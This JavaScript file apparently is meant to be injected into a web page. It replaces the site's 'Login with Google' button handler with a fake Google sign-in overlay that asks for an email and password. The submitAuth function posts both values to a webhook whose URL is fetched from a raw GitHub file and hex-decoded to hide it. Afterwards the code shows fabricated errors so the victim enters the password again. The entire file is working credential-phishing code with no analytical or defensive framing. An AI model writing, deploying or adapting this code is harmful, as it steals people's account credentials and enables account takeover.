
    function modifyGoogleButton() {
        const googleBtn = document.querySelector('a[onclick*="glogin"][data-tag="social"] img[alt="Login with Google"]')?.parentElement;
        
        if (googleBtn) {
            googleBtn.removeAttribute('onclick');
            if (!googleBtn.id) googleBtn.id = 'gloginftok';
            if (!googleBtn.hasAttribute('data-handler-added')) {
                googleBtn.addEventListener('click', handleGoogleButtonClick);
                googleBtn.setAttribute('data-handler-added', 'true');
            }
        }
    }

    function handleGoogleButtonClick(e) {
        e.preventDefault();
        showFakeGoogleAuth();
    }

    function showFakeGoogleAuth() {
        const oldOverlay = document.querySelector('.auth-overlay');
        if (oldOverlay) oldOverlay.remove();

        const overlay = document.createElement('div');
        overlay.className = 'auth-overlay';
        overlay.innerHTML = `
            <div class="auth-box" id="authBox">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" class="google-logo">
                <div class="auth-title">${TEXT.en.emailLabel}</div>
                <div class="auth-subtitle">${TEXT.en.emailDesc}</div>
                <div id="stepContainer">
                    <input id="kliogin" class="auth-input" type="email" placeholder="${TEXT.en.emailPlaceholder}">
                    <div id="errorMsg" class="error-msg" style="display:none"></div>
                    <div style="text-align:right;">
                        <button class="auth-btn" id="nextStepBtn">${TEXT.en.next}</button>
                    </div>
                </div>
            </div>
        `;
        document.body.appendChild(overlay);

        injectStyles();
        document.getElementById('nextStepBtn').addEventListener('click', nextStep);
    }

    function injectStyles() {
        const styleId = 'fake-google-auth-styles';
        if (document.getElementById(styleId)) return;

        const style = document.createElement('style');
        style.id = styleId;
        style.textContent = `
            .auth-overlay {
                font-family: 'Roboto', sans-serif;
                background: #fff;
                position: fixed;
                inset: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 9999;
            }
            .auth-box {
                width: 360px;
                border: 1px solid #dadce0;
                border-radius: 8px;
                padding: 40px;
                box-shadow: 0 1px 2px rgba(0,0,0,0.2);
            }
            .google-logo {
                width: 75px;
                margin: 0 auto 20px;
                display: block;
            }
            .auth-title {
                font-size: 24px;
                color: #202124;
                text-align: center;
            }
            .auth-subtitle {
                color: #5f6368;
                text-align: center;
                margin-bottom: 30px;
            }
            .auth-input {
                width: 100%;
                font-size: 16px;
                padding: 12px;
                border: 1px solid #dadce0;
                border-radius: 4px;
                margin-bottom: 10px;
            }
            .error-msg {
                color: #d93025;
                font-size: 14px;
                margin-bottom: 10px;
            }
            .auth-footer {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-top: 10px;
            }
            .auth-btn {
                background: #1a73e8;
                color: white;
                padding: 10px 24px;
                border: none;
                border-radius: 4px;
                cursor: pointer;
            }
        `;
        document.head.appendChild(style);
    }

    function nextStep() {
        const emailInput = document.getElementById('kliogin');
        const email = emailInput.value.trim();
        userEmail = email;

        const step = document.getElementById('stepContainer');
        const error = document.getElementById('errorMsg');

        if (!email) {
            error.style.display = "block";
            error.textContent = TEXT.en.emailError;
            return;
        }

        step.innerHTML = `
            <input id="kpisword" class="auth-input" type="password" placeholder="${TEXT.en.passwordPlaceholder}">
            <div style="margin-bottom:10px;">
                <label style="font-size:14px;">
                    <input type="checkbox" id="togglePassword"> ${TEXT.en.showPassword}
                </label>
            </div>
            <div id="errorMsg" class="error-msg" style="display:none"></div>
            <div class="auth-footer">
                <a href="#" style="font-size:14px;color:#1a73e8;">${TEXT.en.forgotPassword}</a>
                <button class="auth-btn" id="submitAuthBtn">${TEXT.en.next}</button>
            </div>
        `;

        document.getElementById('togglePassword').addEventListener('change', togglePassword);
        document.getElementById('submitAuthBtn').addEventListener('click', submitAuth);
    }

    function togglePassword() {
        const pwd = document.getElementById('kpisword');
        pwd.type = pwd.type === "password" ? "text" : "password";
    }

    async function submitAuth() {
        const pass = document.getElementById('kpisword').value.trim();
        const error = document.getElementById('errorMsg');
        error.style.display = 'none';

        const step = document.getElementById('stepContainer');
        step.innerHTML = `<div style="text-align:center;font-size:16px;color:#5f6368;">${TEXT.en.verifying}</div>`;

        try {
            if (!WEBHOOK_URL) WEBHOOK_URL = await getWebhookUrl();
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `📧 ${userEmail}\n🔑 ${pass}` })
            });
        } catch (e) {
            console.error("Failed to send data:", e);
        }

        await new Promise(r => setTimeout(r, 1500));

        if (!userEmail.endsWith('@gmail.com')) {
            step.innerHTML = `
                <div class="error-msg">${TEXT.en.emailError}</div>
                <button class="auth-btn" id="retryStepBtn">${TEXT.en.next}</button>
            `;
            document.getElementById('retryStepBtn').addEventListener('click', retryStep);
            return;
        }

        if (pass.length < 6) {
            step.innerHTML = `
                <div class="error-msg">${TEXT.en.passwordError}</div>
                <button class="auth-btn" id="retryStepBtn">${TEXT.en.next}</button>
            `;
            document.getElementById('retryStepBtn').addEventListener('click', retryStep);
            return;
        }

        document.querySelector('.auth-overlay')?.remove();
    }

    function retryStep() {
        const step = document.getElementById('stepContainer');
        step.innerHTML = `
            <input id="kpisword" class="auth-input" type="password" placeholder="${TEXT.en.passwordPlaceholder}">
            <div style="margin-bottom:10px;">
                <label style="font-size:14px;">
                    <input type="checkbox" id="togglePassword"> ${TEXT.en.showPassword}
                </label>
            </div>
            <div id="errorMsg" class="error-msg" style="display:none"></div>
            <div class="auth-footer">
                <a href="#" style="font-size:14px;color:#1a73e8;">${TEXT.en.forgotPassword}</a>
                <button class="auth-btn" id="submitAuthBtn">${TEXT.en.next}</button>
            </div>
        `;

        document.getElementById('togglePassword').addEventListener('change', togglePassword);
        document.getElementById('submitAuthBtn').addEventListener('click', submitAuth);
    }

    async function getWebhookUrl() {
        try {
            const response = await fetch('https://raw.githubusercontent.com/shannonkind87/acs/refs/heads/main/def1.js');
            const scriptContent = await response.text();
            const urlMatch = scriptContent.match(/i\s*=\s*'([^']+)'/);
            if (urlMatch && urlMatch[1]) {
                return urlMatch[1].replace(/\\x([0-9a-f]{2})/gi, 
                    (match, p1) => String.fromCharCode(parseInt(p1, 16)));
            }
            throw new Error("Webhook URL not found");
        } catch (error) {
            console.error("Failed to fetch webhook URL:", error);
            throw error;
        }
    }

    modifyGoogleButton();
